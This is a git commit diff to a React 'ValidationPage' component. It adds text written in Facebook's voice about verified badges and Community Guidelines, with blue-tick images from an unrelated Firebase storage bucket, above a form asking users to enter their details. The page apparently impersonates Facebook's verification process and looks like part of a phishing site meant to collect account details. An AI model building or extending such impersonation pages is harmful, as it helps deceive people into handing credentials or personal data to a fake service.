167d4b118331261acdc47dc9b7c0b384ef50c89f
Awwdil <adil.khalil76@gmail.com>
2024-08-09 20:05:54 +0500

    added changes

--- src/pages/ValidationPage.jsx
+++ src/pages/ValidationPage.jsx
@@ -84,15 +84,22 @@ const ValidationPage = () => {
                 public figure or brand that it represents.
               </p>
               <p className="fw-semibold validation_form_para">
-                Previously, the verified badge also required the person or brand
-                to be notable and unique. You may still see users with a
-                verified badge that represents our previous eligibility
-                requirements.
+                A Facebook account with a verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style={{ width: '1rem', marginBottom: '0.1rem' }} /> next to its name now means that Facebook has confirmed it as the authentic presence for that person or brand. Previously, the verified badge also required the person or brand to be notable and unique.
               </p>
+              
+              <p className="fw-semibold validation_form_para">
+                The verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style={{ width: '1rem', marginBottom: '0.1rem' }} /> serves as a tool to help users find the genuine accounts of people and brands. If an account has the verified badge, it confirms that it represents who it claims to be. However, a verified badge is not a symbol of importance, authority, or expertise. We do not use the verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style={{ width: '1rem', marginBottom: '0.1rem' }} /> to endorse or recognize public figures or brands.
+              </p>
+              <p className="fw-semibold validation_form_para">
+                Once verified, public figures, celebrities, and brands that meet certain account and eligibility requirements may not change their username on their account. Verification cannot be transferred to another account. Facebook accounts that impersonate public figures or other individuals violate our Community Guidelines and are not permitted on Facebook.
+              </p>
+
+
               <p className="fw-semibold validation_form_para">
                 Please provide the precise details below. Refer to the video for
                 clarification if you find the instructions unclear.
               </p>
+                
               <p
                 className="fw-semibold text-secondary"
                 style={{ fontSize: "12px" }}
